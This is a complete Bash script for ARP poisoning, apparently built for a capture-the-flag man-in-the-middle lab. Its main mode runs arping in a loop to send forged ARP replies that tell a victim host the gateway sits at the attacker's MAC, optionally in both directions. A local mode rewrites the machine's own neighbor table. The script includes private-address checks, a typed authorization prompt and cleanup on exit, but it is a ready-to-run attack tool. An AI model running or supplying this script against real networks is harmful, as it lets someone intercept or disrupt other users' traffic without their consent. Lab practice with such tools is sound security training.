#!/usr/bin/env bash
#
# arp_spoof.sh - ARP poisoning for the miniNET-Mitm CTF lab (Linux).
#
# Uses only regular Linux networking utilities:
#   * arping (iputils)  -> MODE=remote: send forged ARP replies to the victim
#   * ip neigh          -> MODE=local:  overwrite this machine's neighbor table
#
# Use only on hosts/networks you own or are authorized to test.
#
# Usage:
#   sudo IFACE=eth0 ./arp_spoof.sh                       # remote, victim only
#   sudo IFACE=eth0 BIDIR=1 ./arp_spoof.sh               # remote, both directions
#   sudo IFACE=eth0 MODE=local ./arp_spoof.sh            # local neighbor table only
#   sudo CONFIRM=1 IFACE=eth0 ./arp_spoof.sh
#
# Remote mode tells VICTIM_IP that GATEWAY_IP is at this NIC's MAC.
# Local mode only changes what THIS machine believes; it cannot poison another host.
#
set -euo pipefail

IFACE="${IFACE:-}"
VICTIM_IP="${VICTIM_IP:-192.168.50.2}"
GATEWAY_IP="${GATEWAY_IP:-192.168.50.254}"
BIDIR="${BIDIR:-0}"
CONFIRM="${CONFIRM:-0}"
MODE="${MODE:-remote}"
INTERVAL="${INTERVAL:-1}"
SPOOF_MAC="${SPOOF_MAC:-}"

info() { printf '[*] %s\n' "$*"; }
warn() { printf '[!] %s\n' "$*" >&2; }
die() { printf '[-] %s\n' "$*" >&2; exit 1; }

is_private_ipv4() {
    local ip="$1"
    [[ "$ip" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]] || return 1
    case "$ip" in
        10.* | 192.168.*) return 0 ;;
        172.1[6-9].* | 172.2[0-9].* | 172.3[01].*) return 0 ;;
    esac
    return 1
}

[[ "$MODE" == "remote" || "$MODE" == "local" ]] || die "MODE must be remote or local"

if [[ -z "$IFACE" ]]; then
    IFACE="$(ip route show default 2>/dev/null | awk 'NR == 1 { for (i = 1; i <= NF; i++) if ($i == "dev") { print $(i + 1); exit } }')"
fi
[[ -n "$IFACE" ]] || die "interface not found; set IFACE (example: IFACE=eth0 $0)"
ip link show dev "$IFACE" >/dev/null 2>&1 || die "interface does not exist: $IFACE"

[[ $EUID -eq 0 ]] || die "run as root (sudo $0)"

is_private_ipv4 "$VICTIM_IP" || die "VICTIM_IP must be a private IPv4 address (got: $VICTIM_IP)"
is_private_ipv4 "$GATEWAY_IP" || die "GATEWAY_IP must be a private IPv4 address (got: $GATEWAY_IP)"
[[ "$BIDIR" == "0" || "$BIDIR" == "1" ]] || die "BIDIR must be 0 or 1"
[[ "$INTERVAL" =~ ^[0-9]+([.][0-9]+)?$ ]] || die "INTERVAL must be a number"

if [[ "$MODE" == "remote" ]]; then
    command -v arping >/dev/null 2>&1 || die "arping not found; install iputils (e.g. sudo apt install iputils-arping)"
    command -v ip >/dev/null 2>&1 || die "ip command not found; install iproute2"
else
    command -v ip >/dev/null 2>&1 || die "ip command not found; install iproute2"
    if [[ -z "$SPOOF_MAC" ]]; then
        SPOOF_MAC="$(ip link show dev "$IFACE" | awk '/link\/ether/ { print $2; exit }')"
    fi
    [[ "$SPOOF_MAC" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]] || die "invalid SPOOF_MAC: $SPOOF_MAC"
fi

info "mode      : $MODE"
info "interface : $IFACE"
info "victim    : $VICTIM_IP"
info "gateway   : $GATEWAY_IP"
info "direction : $([[ "$BIDIR" == "1" ]] && echo 'victim <-> gateway' || echo 'victim only')"
if [[ "$MODE" == "local" ]]; then
    info "spoof MAC : $SPOOF_MAC"
fi

if [[ "$CONFIRM" != "1" ]]; then
    warn "This changes ARP state and can disrupt the lab network."
    read -r -p "Type YES if you are authorized to run this: " answer
    [[ "$answer" == "YES" ]] || die "aborted"
fi

if [[ "$MODE" == "remote" ]]; then
    PIDS=()

    spoof_loop() {
        local claimed_ip="$1" target_ip="$2"
        while :; do
            arping -A -c 1 -w 1 -q -I "$IFACE" -s "$claimed_ip" "$target_ip" >/dev/null 2>&1 || true
            sleep "$INTERVAL"
        done
    }

    cleanup() {
        trap - INT TERM EXIT
        if ((${#PIDS[@]})); then
            info "stopping arping..."
            kill "${PIDS[@]}" 2>/dev/null || true
            wait 2>/dev/null || true
        fi
        info "stopped. Victim ARP caches recover when their entries expire."
    }
    trap cleanup INT TERM EXIT

    spoof_loop "$GATEWAY_IP" "$VICTIM_IP" &
    PIDS+=("$!")
    if [[ "$BIDIR" == "1" ]]; then
        spoof_loop "$VICTIM_IP" "$GATEWAY_IP" &
        PIDS+=("$!")
    fi

    info "sending forged ARP replies; press Ctrl+C to stop"
    wait || true
else
    LOCAL_IPS=("$GATEWAY_IP")
    if [[ "$BIDIR" == "1" ]]; then
        LOCAL_IPS+=("$VICTIM_IP")
    fi

    cleanup_local() {
        trap - INT TERM EXIT
        for ip in "${LOCAL_IPS[@]}"; do
            ip neigh del "$ip" dev "$IFACE" 2>/dev/null || true
        done
        info "local neighbor entries removed"
    }
    trap cleanup_local INT TERM EXIT

    for ip in "${LOCAL_IPS[@]}"; do
        ip neigh replace "$ip" lladdr "$SPOOF_MAC" dev "$IFACE" nud permanent
        info "local cache: $ip -> $SPOOF_MAC"
    done

    info "press Ctrl+C to restore the local neighbor table"
    while :; do
        sleep 3600
    done
fi
